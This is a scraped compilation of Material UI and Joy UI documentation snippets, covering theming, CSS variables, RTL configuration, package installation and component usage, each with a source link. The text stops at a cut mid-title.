Material-UI\nDESCRIPTION: Shows how to implement accessible font icons using the Icon component with visually hidden text for screen readers. The example includes the visuallyHidden utility from MUI for creating invisible but accessible text descriptions.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/icons/icons.md#2025-04-22_snippet_9\n\nLANGUAGE: jsx\nCODE:\n```\nimport Box from '@mui/material/Box';\nimport Icon from '@mui/material/Icon';\nimport { visuallyHidden } from '@mui/utils';\n\n// ...\n\n<Icon>add_circle</Icon>\n<Box component=\"span\" sx={visuallyHidden}>Create a user</Box>\n```\n\n----------------------------------------\n\nTITLE: Assembling Joy UI Component with Slots\nDESCRIPTION: Shows how to assemble a complete component using the previously created styled slots.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/creating-themed-components/creating-themed-components.md#2025-04-22_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\n// /path/to/Stat.js\nimport * as React from 'react';\n\nconst StatRoot = styled('div', {\n  name: 'JoyStat',\n  slot: 'root',\n})(…);\n\nconst StatValue = styled('div', {\n  name: 'JoyStat',\n  slot: 'value',\n})(…);\n\nconst StatUnit = styled('div', {\n  name: 'JoyStat',\n  slot: 'unit',\n})(…);\n\nconst Stat = React.forwardRef(function Stat(props, ref) {\n  const { value, unit, ...other } = props;\n\n  return (\n    <StatRoot ref={ref} {...other}>\n      <StatValue>{value}</StatValue>\n      <StatUnit>{unit}</StatUnit>\n    </StatRoot>\n  );\n});\n\nexport default Stat;\n```\n\n----------------------------------------\n\nTITLE: Setting Up CSS Theme Variables for Shadow DOM\nDESCRIPTION: This snippet demonstrates how to configure CSS theme variables to work within the shadow DOM by setting the appropriate selectors and colorSchemeNode.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/shadow-dom/shadow-dom.md#2025-04-22_snippet_2\n\nLANGUAGE: diff\nCODE:\n```\n const theme = createTheme({\n+  cssVariables: {\n+    rootSelector: ':host',\n+    colorSchemeSelector: 'class',\n+  },\n   components: {\n     // ...same as above steps\n   }\n })\n```\n\nLANGUAGE: diff\nCODE:\n```\n <ThemeProvider\n   theme={theme}\n+  colorSchemeNode={shadowRootElement}\n >\n```\n\n----------------------------------------\n\nTITLE: Setting Up Dark Mode in Next.js Pages Router with Joy UI\nDESCRIPTION: Configures a Next.js Pages Router project to support dark mode with Joy UI, preventing screen flickering on initial load by using InitColorSchemeScript before the main application script.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/dark-mode/dark-mode.md#2025-04-22_snippet_3\n\nLANGUAGE: jsx\nCODE:\n```\nimport Document, { Html, Head, Main, NextScript } from 'next/document';\nimport InitColorSchemeScript from '@mui/joy/InitColorSchemeScript';\n\nexport default class MyDocument extends Document {\n  render() {\n    return (\n      <Html data-color-scheme=\"light\">\n        <Head>...</Head>\n        <body>\n          <InitColorSchemeScript />\n          <Main />\n          <NextScript />\n        </body>\n      </Html>\n    );\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Chip with Delete Button Implementation - React/JSX\nDESCRIPTION: Implementation showing how to use the ChipDelete component to add delete functionality to a chip. The delete action can be triggered by keyboard events (Backspace, Enter, Delete) or by clicking.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/chip/chip.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nimport ChipDelete from '@mui/joy/ChipDelete';\n```\n\n----------------------------------------\n\nTITLE: Basic Container Query Usage in Material UI\nDESCRIPTION: Demonstrates basic usage of container queries using theme.containerQueries with breakpoint values.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/container-queries/container-queries.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\ntheme.containerQueries.up('sm'); // => '@container (min-width: 600px)'\n```\n\n----------------------------------------\n\nTITLE: Vite.js Material UI and Tailwind Integration\nDESCRIPTION: Configuration for integrating Material UI with Tailwind CSS in a Vite-based application using StyledEngineProvider.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/tailwindcss/tailwindcss-v4.md#2025-04-22_snippet_4\n\nLANGUAGE: tsx\nCODE:\n```\nimport { StyledEngineProvider } from '@mui/material/styles';\nimport GlobalStyles from '@mui/material/GlobalStyles';\n\nReactDOM.createRoot(document.getElementById('root')!).render(\n  <React.StrictMode>\n    <StyledEngineProvider enableCssLayer>\n      <GlobalStyles styles=\"@layer theme, base, mui, components, utilities;\" />\n      {/* Your app */}\n    </StyledEngineProvider>\n  </React.StrictMode>,\n);\n```\n\n----------------------------------------\n\nTITLE: Using Portal Component with Server-Side Rendering in React\nDESCRIPTION: Demonstrates how to use the Portal component with server-side rendering by utilizing the container prop callback. This approach is necessary when the DOM API is not available on the server.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/portal/portal.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<Portal container={() => document.getElementById('filter-panel')!}>\n  <Child />\n</Portal>\n```\n\n----------------------------------------\n\nTITLE: Styling with styled function in Joy UI\nDESCRIPTION: Example of using theme.vars notation with styled function to apply CSS variable-based styles.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/using-css-variables/using-css-variables.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\nconst Div = styled('div')(({ theme }) => ({\n  // Outputs 'var(--joy-palette-primary-500)'\n  color: theme.vars.palette.primary[500],\n}));\n```\n\n----------------------------------------\n\nTITLE: Implementing Responsive Typography with Media Queries\nDESCRIPTION: Shows how to create responsive typography using media queries and breakpoints in Material UI theme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/typography/typography.md#2025-04-22_snippet_3\n\nLANGUAGE: javascript\nCODE:\n```\nconst theme = createTheme();\n\ntheme.typography.h3 = {\n  fontSize: '1.2rem',\n  '@media (min-width:600px)': {\n    fontSize: '1.5rem',\n  },\n  [theme.breakpoints.up('md')]: {\n    fontSize: '2.4rem',\n  },\n};\n```\n\n----------------------------------------\n\nTITLE: Basic Divider Implementation in Joy UI\nDESCRIPTION: Demonstrates the basic implementation of a Divider component in a React application using Joy UI. This code shows the minimal setup required to render a simple divider.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/divider/divider.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Divider from '@mui/joy/Divider';\n\nexport default function MyApp() {\n  return <Divider />;\n}\n```\n\n----------------------------------------\n\nTITLE: Using Custom Option Structure with getOptionLabel\nDESCRIPTION: Demonstrates how to use the getOptionLabel prop to handle custom option structures where the display text is in a different property.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/autocomplete/autocomplete.md#2025-04-22_snippet_2\n\nLANGUAGE: js\nCODE:\n```\nconst options = [\n  { title: 'Pulp Fiction', id: 2 },\n  // ...\n];\n\n<Autocomplete getOptionLabel={option => option.title}>\n```\n\n----------------------------------------\n\nTITLE: Installing RTL Style Plugin Dependencies\nDESCRIPTION: Commands to install the necessary stylis and stylis-plugin-rtl packages for RTL styling with different package managers.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/right-to-left/right-to-left.md#2025-04-22_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nnpm install stylis stylis-plugin-rtl\n```\n\nLANGUAGE: bash\nCODE:\n```\npnpm add stylis stylis-plugin-rtl\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn add stylis stylis-plugin-rtl\n```\n\n----------------------------------------\n\nTITLE: Basic FAB Implementation in React\nDESCRIPTION: Demonstrates the basic implementation of Floating Action Buttons with different variants and icons.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/floating-action-button/floating-action-button.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nFloatingActionButtons.js\n```\n\n----------------------------------------\n\nTITLE: Creating a Theme with Font Integration for Next.js App Router\nDESCRIPTION: JavaScript code for creating a Material UI theme with Next.js font integration using CSS variables.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/nextjs/nextjs.md#2025-04-22_snippet_4\n\nLANGUAGE: js\nCODE:\n```\n'use client';\nimport { createTheme } from '@mui/material/styles';\n\nconst theme = createTheme({\n  typography: {\n    fontFamily: 'var(--font-roboto)',\n  },\n});\n\nexport default theme;\n```\n\n----------------------------------------\n\nTITLE: Importing Roboto Font Weights\nDESCRIPTION: TypeScript/JavaScript code to import different weights of Roboto font from Fontsource.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/installation/installation.md#2025-04-22_snippet_4\n\nLANGUAGE: tsx\nCODE:\n```\nimport '@fontsource/roboto/300.css';\nimport '@fontsource/roboto/400.css';\nimport '@fontsource/roboto/500.css';\nimport '@fontsource/roboto/700.css';\n```\n\n----------------------------------------\n\nTITLE: Importing ListDivider Component in React\nDESCRIPTION: Shows how to import the ListDivider component, which is used to create separators between list items with various inset options.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/list/list.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\nimport ListDivider from '@mui/joy/ListDivider';\n```\n\n----------------------------------------\n\nTITLE: Handling Snackbar Close Events\nDESCRIPTION: Example of accessing the close reason in the onClose callback function. The reason can be 'timeout', 'clickaway', or 'escapeKeyDown'.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/snackbar/snackbar.md#2025-04-22_snippet_1\n\nLANGUAGE: js\nCODE:\n```\n<Snackbar onClose={(event, reason) => {\n  // reason will be one of: timeout, clickaway, escapeKeyDown\n}}>\n```\n\n----------------------------------------\n\nTITLE: ButtonGroup with Disabled Elevation\nDESCRIPTION: Shows how to remove the elevation effect from ButtonGroup using the disableElevation prop.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/button-group/button-group.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\n<ButtonGroup disableElevation variant=\"contained\">\n  <Button>One</Button>\n  <Button>Two</Button>\n</ButtonGroup>\n```\n\n----------------------------------------\n\nTITLE: Adjusting Avatar Spacing in AvatarGroup\nDESCRIPTION: Demonstrates how to change the spacing between avatars in an AvatarGroup using the 'spacing' prop, with preset and custom numeric values.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/avatars/avatars.md#2025-04-22_snippet_10\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"Spacing.js\"}\n```\n\n----------------------------------------\n\nTITLE: Using Different React Versions for Testing in Material-UI\nDESCRIPTION: This command allows testing Material-UI with different versions of React. It can be used to check integration with various React release channels or specific versions.\nSOURCE: https://github.com/mui/material-ui/blob/master/test/README.md#2025-04-22_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\npnpm use-react-version <version>\n```\n\n----------------------------------------\n\nTITLE: Setting Flex Wrap with Material-UI Box Component in JSX\nDESCRIPTION: Demonstrates how to control whether flex items wrap onto multiple lines using the flexWrap property. Options include nowrap (default), wrap, and wrap-reverse.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/flexbox/flexbox.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Box sx={{ flexWrap: 'nowrap' }}>…\n<Box sx={{ flexWrap: 'wrap' }}>…\n<Box sx={{ flexWrap: 'wrap-reverse' }}>…\n```\n\n----------------------------------------\n\nTITLE: TypeScript Interface for Virtual Element Popover\nDESCRIPTION: TypeScript interface definition for implementing a virtual DOM element as an anchor for the Popover component. The interface requires nodeType and getBoundingClientRect properties.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/popover/popover.md#2025-04-22_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface PopoverVirtualElement {\n  nodeType: 1;\n  getBoundingClientRect: () => DOMRect;\n}\n```\n\n----------------------------------------\n\nTITLE: Preventing Default ClickAway in Snackbar\nDESCRIPTION: Example showing how to prevent the default click away behavior in Snackbar using event.defaultMuiPrevented.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/snackbars/snackbars.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\n<Snackbar\n  slotProps={{\n    clickAwayListener: {\n      onClickAway: (event) => {\n        // Prevent's default 'onClickAway' behavior.\n        event.defaultMuiPrevented = true;\n      },\n    },\n  }}\n/>\n```\n\n----------------------------------------\n\nTITLE: Basic Tooltip Implementation in React with Joy UI\nDESCRIPTION: Basic implementation showing how to import and use the Tooltip component from Joy UI after installation.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/tooltip/tooltip.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport Tooltip from '@mui/joy/Tooltip';\n\nexport default function MyApp() {\n  return <Tooltip />;\n}\n```\n\n----------------------------------------\n\nTITLE: Loading ButtonGroup Implementation\nDESCRIPTION: Demonstrates how to implement loading state in ButtonGroup using the loading prop from Button component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/button-group/button-group.md#2025-04-22_snippet_6\n\nLANGUAGE: jsx\nCODE:\n```\n<ButtonGroup>\n  <Button loading>Submit</Button>\n  <Button>Cancel</Button>\n</ButtonGroup>\n```\n\n----------------------------------------\n\nTITLE: Importing FocusTrap Component from MUI Base\nDESCRIPTION: Shows how to import the FocusTrap component from @mui/base. This component traps the keyboard focus within its children.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/2021-q3-update.md#2025-04-22_snippet_6\n\nLANGUAGE: jsx\nCODE:\n```\nimport { FocusTrap } from '@mui/base/FocusTrap';\n```\n\n----------------------------------------\n\nTITLE: Menu List Composition\nDESCRIPTION: Custom menu composition using MenuList component with Popper for positioning.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/menus/menus.md#2025-04-22_snippet_5\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"MenuListComposition.js\", \"bg\": true}\n```\n\n----------------------------------------\n\nTITLE: Installing MUI Base via npm in Bash\nDESCRIPTION: This command installs the MUI Base package using npm. It's one of the methods provided to add MUI Base to a project, allowing developers to start using the library's components and hooks.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/introducing-base-ui.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/base\n```\n\n----------------------------------------\n\nTITLE: Grouped Menu with Headers\nDESCRIPTION: Menu implementation with categorized items using ListSubheader component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/menus/menus.md#2025-04-22_snippet_12\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"GroupedMenu.js\"}\n```\n\n----------------------------------------\n\nTITLE: Customizing Typography Variant Mapping in Material-UI Theme\nDESCRIPTION: JavaScript code to customize the global mapping of typography variants to HTML elements in the Material-UI theme configuration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/typography/typography.md#2025-04-22_snippet_4\n\nLANGUAGE: js\nCODE:\n```\nconst theme = createTheme({\n  components: {\n    MuiTypography: {\n      defaultProps: {\n        variantMapping: {\n          h1: 'h2',\n          h2: 'h2',\n          h3: 'h2',\n          h4: 'h2',\n          h5: 'h2',\n          h6: 'h2',\n          subtitle1: 'h2',\n          subtitle2: 'h2',\n          body1: 'span',\n          body2: 'span',\n        },\n      },\n    },\n  },\n});\n```\n\n----------------------------------------\n\nTITLE: Change in Default theme.palette.info Colors\nDESCRIPTION: Diff showing the updated default info color palette to meet AA accessibility standards in both light and dark modes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_14\n\nLANGUAGE: diff\nCODE:\n```\n  info = {\n-  main: cyan[500],\n+  main: lightBlue[700], // lightBlue[400] in \"dark\" mode\n\n-  light: cyan[300],\n+  light: lightBlue[500], // lightBlue[300] in \"dark\" mode\n\n-  dark: cyan[700],\n+  dark: lightBlue[900], // lightBlue[700] in \"dark\" mode\n  }\n```\n\n----------------------------------------\n\nTITLE: Image List with Title Bars Implementation\nDESCRIPTION: Example of using ImageListItemBar to add overlay titles and actions to image list items.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/image-list/image-list.md#2025-04-22_snippet_4\n\nLANGUAGE: jsx\nCODE:\n```\n{\"demo\": \"TitlebarImageList.js\"}\n```\n\n----------------------------------------\n\nTITLE: Updating Grid Import Statements for Material UI v6\nDESCRIPTION: Shows how to update import statements when migrating from Grid to Grid2 in Material UI v6.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-grid-v2/upgrade-to-grid-v2.md#2025-04-22_snippet_1\n\nLANGUAGE: diff\nCODE:\n```\n// The legacy Grid component is named Grid\n-import Grid from '@mui/material/Grid';\n\n// The updated Grid component is named Grid2\n+import Grid from '@mui/material/Grid2';\n```\n\n----------------------------------------\n\nTITLE: Using CSS Baseline to apply default typography styles in Joy UI\nDESCRIPTION: Example showing how CSS Baseline component applies 'body-md' as the default typography level on the global stylesheet.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/theme-typography/theme-typography.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\n<CssBaseline />\n\n// inherits the `theme.typography['body-md']` styles\n<p>Hello World</p>\n```\n\n----------------------------------------\n\nTITLE: Creating Music Player Slider in React\nDESCRIPTION: Shows how to implement a slider component styled as a music player control using Material-UI.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/slider/slider.md#2025-04-22_snippet_12\n\nLANGUAGE: JSX\nCODE:\n```\n{\"demo\": \"MusicPlayerSlider.js\", \"bg\": \"inline\"}\n```\n\n----------------------------------------\n\nTITLE: Multiple Arguments Spacing Syntax\nDESCRIPTION: Demonstrates the use of multiple arguments in theme.spacing() to reduce boilerplate code\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/customization/spacing/spacing.md#2025-04-22_snippet_4\n\nLANGUAGE: javascript\nCODE:\n```\n-padding: `${theme.spacing(1)} ${theme.spacing(2)}`, // '8px 16px'\n+padding: theme.spacing(1, 2), // '8px 16px'\n```\n\n----------------------------------------\n\nTITLE: Adding Material Icons via Google Web Fonts CDN\nDESCRIPTION: HTML code to include Material Icons font from Google Web Fonts CDN in your project.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/getting-started/installation/installation.md#2025-04-22_snippet_7\n\nLANGUAGE: html\nCODE:\n```\n<link\n  rel=\"stylesheet\"\n  href=\"https://fonts.googleapis.com/icon?family=Material+Icons\"\n/>\n```\n\n----------------------------------------\n\nTITLE: Creating Custom makeStyles and withStyles for TSS\nDESCRIPTION: Example of creating custom makeStyles and withStyles functions for TSS, allowing for better TypeScript integration with Material UI themes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_24\n\nLANGUAGE: TypeScript\nCODE:\n```\nimport { useTheme } from '@mui/material/styles';\nimport { createMakeAndWithStyles } from 'tss-react';\n\nexport const { makeStyles, withStyles } = createMakeAndWithStyles({\n  useTheme,\n});\n```\n\n----------------------------------------\n\nTITLE: Inferring Dimensions from Children in React JSX\nDESCRIPTION: This snippet illustrates how to use the Skeleton component to infer dimensions from its children, in this case, an Avatar component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/skeleton/skeleton.md#2025-04-22_snippet_2\n\nLANGUAGE: jsx\nCODE:\n```\nloading ? (\n  <Skeleton variant=\"circular\">\n    <Avatar />\n  </Skeleton>\n) : (\n  <Avatar src={data.avatar} />\n);\n```\n\n----------------------------------------\n\nTITLE: Using the Default DatePicker with Integrated Field in MUI X v6 (JSX)\nDESCRIPTION: This code demonstrates the simplified usage of the `DatePicker` component in MUI X v6. It shows importing the `DatePicker` and rendering it with a label. Notably, it highlights that the new `DatePicker` uses the improved 'Field' component internally by default, eliminating the need to explicitly provide a `renderInput` prop with a `TextField` for standard use cases.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/v6-beta-pickers.md#2025-04-22_snippet_1\n\nLANGUAGE: jsx\nCODE:\n```\nimport { DatePicker } from '@mui/x-date-pickers/DatePicker';\n\n<DatePicker label=\"My first v6 picker\" />;\n```\n\n----------------------------------------\n\nTITLE: Configuring RTL with Emotion's CacheProvider\nDESCRIPTION: Setup for RTL support with Emotion by creating a cache with the stylis-plugin-rtl plugin and using CacheProvider to wrap your application.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/customization/right-to-left/right-to-left.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\nimport { CacheProvider } from '@emotion/react';\nimport createCache from '@emotion/cache';\nimport { prefixer } from 'stylis';\nimport rtlPlugin from 'stylis-plugin-rtl';\n\n// Create rtl cache\nconst cacheRtl = createCache({\n  key: 'muirtl',\n  stylisPlugins: [prefixer, rtlPlugin],\n});\n\nfunction Rtl(props) {\n  return <CacheProvider value={cacheRtl}>{props.children}</CacheProvider>;\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Global Variant Tokens in Joy UI Theme (JavaScript)\nDESCRIPTION: This snippet demonstrates how to define custom tokens for the 'solid' variant in the Joy UI theme configuration. It shows the structure for both light and dark color schemes, focusing on the primary and neutral palettes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/main-features/global-variants/global-variants.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  colorSchemes: {\n    light: {\n      palette: {\n        primary: {\n          solidBg: 'var(--joy-palette-primary-600)',       // the initial background\n          solidColor: '#fff',                              // the initial color\n          solidHoverBg: 'var(--joy-palette-primary-700)',  // the :hover background\n          solidActiveBg: 'var(--joy-palette-primary-800)', // the :active background\n          // ...other tokens\n        },\n        neutral: {\n          solidBg: 'var(--joy-palette-primary-700)',\n          solidColor: '#fff',\n          solidHoverBg: 'var(--joy-palette-primary-800)',\n          solidActiveBg: 'var(--joy-palette-primary-900)',\n          // ...other tokens\n        },\n        // ...other palettes\n      }\n    },\n    dark: {\n      palette: {\n        // similar structure but different values\n      }\n    },\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Chip Component Usage\nDESCRIPTION: Basic implementation of Material-UI Chip component with both outlined and filled styling options.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/chips/chips.md#2025-04-22_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport * as React from 'react';\nimport Chip from '@mui/material/Chip';\nimport Stack from '@mui/material/Stack';\n\nexport default function BasicChips() {\n  return (\n    <Stack direction=\"row\" spacing={1}>\n      <Chip label=\"Chip Filled\" />\n      <Chip label=\"Chip Outlined\" variant=\"outlined\" />\n    </Stack>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Replacing State Class Names in Theme StyleOverrides with Emotion\nDESCRIPTION: Example showing how to replace JSS local rule references ($syntax) with valid class selectors when migrating theme styleOverrides to Emotion. This demonstrates changing a state class reference.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/migration-v4/v5-style-changes.md#2025-04-22_snippet_0\n\nLANGUAGE: diff\nCODE:\n```\n const theme = createTheme({\n   components: {\n     MuiOutlinedInput: {\n       styleOverrides: {\n         root: {\n-          '&$focused': {\n+          '&.Mui-focused': {\n             borderWidth: 1,\n           }\n         }\n       }\n     }\n   }\n });\n```\n\n----------------------------------------\n\nTITLE: Implementing Advanced Filtering with match-sorter\nDESCRIPTION: Shows how to implement richer filtering mechanisms using the match-sorter library for features like fuzzy matching in the Autocomplete component.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/joy/components/autocomplete/autocomplete.md#2025-04-22_snippet_5\n\nLANGUAGE: jsx\nCODE:\n```\nimport { matchSorter } from 'match-sorter';\n\nconst filterOptions = (options, { inputValue }) => matchSorter(options, inputValue);\n\n<Autocomplete filterOptions={filterOptions} />;\n```\n\n----------------------------------------\n\nTITLE: Implementing Callback in styleOverrides for Material UI Theme\nDESCRIPTION: This snippet demonstrates how to use a callback function in the styleOverrides of a Material UI theme to dynamically style components based on props and theme.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/pages/blog/callback-support-in-style-overrides.md#2025-04-22_snippet_0\n\nLANGUAGE: jsx\nCODE:\n```\nimport { ThemeProvider, createTheme } from '@mui/material/styles';\n\n<ThemeProvider\n  theme={createTheme({\n    components: {\n      MuiChip: {\n        styleOverrides: {\n          // you can now use the theme without creating the initial theme!\n          root: ({ ownerState, theme }) => ({\n            padding: {\n              small: '8px 4px',\n              medium: '12px 6px',\n              large: '16px 8px',\n            }[ownerState.size],\n            ...(ownerState.variant === 'outlined' && {\n              borderWidth: '2px',\n              ...(ownerState.variant === 'primary' && {\n                borderColor: theme.palette.primary.light,\n              }),\n            }),\n          }),\n          label: {\n            padding: 0,\n          },\n        },\n      },\n    },\n  })}\n>\n  ...your app\n</ThemeProvider>;\n```\n\n----------------------------------------\n\nTITLE: Extending Theme with CSS Variables in Material UI\nDESCRIPTION: Creates a custom theme with light and dark color schemes that uses CSS variables. It defines color palettes for both schemes and prepares CSS variables with appropriate prefixes.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/system/experimental-api/css-theme-variables/css-theme-variables.md#2025-04-22_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\n// extendTheme.js\nimport {\n  unstable_createGetCssVar as systemCreateGetCssVar,\n  unstable_prepareCssVars as prepareCssVars,\n} from '@mui/system';\n\nconst lightColorScheme = {\n  palette: {\n    mode: 'light',\n    primary: {\n      default: '#3990FF',\n      dark: '#02367D',\n    },\n    text: {\n      default: '#111111',\n    },\n    // ... other colors\n  },\n};\n\nconst darkColorScheme = {\n  palette: {\n    mode: 'dark',\n    primary: {\n      default: '#265D97',\n      dark: '#132F4C',\n      main: '#5090D3',\n    },\n    text: {\n      default: '#ffffff',\n    },\n    // ... other colors\n  },\n};\n\nconst createGetCssVar = (cssVarPrefix = 'my-app') =>\n  systemCreateGetCssVar(cssVarPrefix);\n\nfunction extendTheme({ cssVarPrefix = 'my-app' } = {}) {\n  const getCssVar = createGetCssVar(cssVarPrefix);\n  const theme = {\n    colorSchemes: {\n      light: lightColorScheme,\n      dark: darkColorScheme,\n    },\n    // ... any other objects independent of color-scheme,\n    // like fontSizes, spacing tokens, etc\n  };\n\n  const { vars: themeVars, generateCssVars } = prepareCssVars(\n    { colorSchemes: theme.colorSchemes },\n    {\n      prefix: cssVarPrefix,\n    },\n  );\n  theme.vars = themeVars;\n  theme.generateCssVars = generateCssVars;\n  theme.palette = {\n    ...theme.colorSchemes.light.palette,\n    colorScheme: 'light',\n  };\n\n  return theme;\n}\n\nconst myCustomDefaultTheme = extendTheme();\n\nexport default myCustomDefaultTheme;\n```\n\n----------------------------------------\n\nTITLE: Installing Pigment CSS Dependencies with npm, pnpm, and yarn\nDESCRIPTION: Commands for installing the core Pigment CSS packages required for Material UI integration using different package managers.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/migration/upgrade-to-v6/migrating-to-pigment-css.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/material-pigment-css @pigment-css/react\n```\n\nLANGUAGE: bash\nCODE:\n```\npnpm add @mui/material-pigment-css @pigment-css/react\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @mui/material-pigment-css @pigment-css/react\n```\n\n----------------------------------------\n\nTITLE: Installing Material Icons Package\nDESCRIPTION: Commands to install the @mui/icons-material package using npm, pnpm, or yarn. This package provides pre-built React components for Material Icons.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/components/icons/icons.md#2025-04-22_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install @mui/icons-material\n```\n\nLANGUAGE: bash\nCODE:\n```\npnpm add @mui/icons-material\n```\n\nLANGUAGE: bash\nCODE:\n```\nyarn add @mui/icons-material\n```\n\n----------------------------------------\n\nTITLE: Using React Router Link with Button Component\nDESCRIPTION: Demonstrates passing a React Router Link component to Material UI Button's component prop for navigation integration.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/guides/composition/composition.md#2025-04-22_snippet_3\n\nLANGUAGE: tsx\nCODE:\n```\nimport { Link } from 'react-router';\nimport Button from '@mui/material/Button';\n\nfunction Demo() {\n  return (\n    <Button component={Link} to=\"/react-router\">\n      React router link\n    </Button>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Dependencies and Running the Joy UI Project\nDESCRIPTION: Commands for installing the project dependencies and starting the development server using npm.\nSOURCE: https://github.com/mui/material-ui/blob/master/examples/joy-ui-vite-ts/README.md#2025-04-22_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nnpm install\nnpm run dev\n```\n\n----------------------------------------\n\nTITLE: Styling Slider with Custom Thumb using styled-components\nDESCRIPTION: Demonstrates how to create a custom styled Slider component with a customized thumb using styled-components. The example shows using the slotProps API to provide a custom class name for the thumb.\nSOURCE: https://github.com/mui/material-ui/blob/master/docs/data/material/integrations/interoperability/interoperability.md#2025-04-22_snippet_8\n\nLANGUAGE: jsx\nCODE:\n```\nimport * as React from 'react';\nimport { styled } from '@mui/material/styles';\nimport Slider from '@mui/material/Slider';\n\nconst CustomizedSlider = styled((props) => (\n  <Slider slotProps={{ thumb: { className: 'thumb' } }} {...props} />\n))`\n  color: #20b2aa;\n\n  :hover {\n    color: #2e8b57;\n  }\n\n  & .thumb {\n    border-radius: 1px;\n  }\n`;\n\nexport default function StyledComponentsDeep2() {\n  return (\n    <div>\n      <Slider defaultValue={30} />\n      <CustomizedSlider defaultValue={30} />\n    </div>\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Displaying 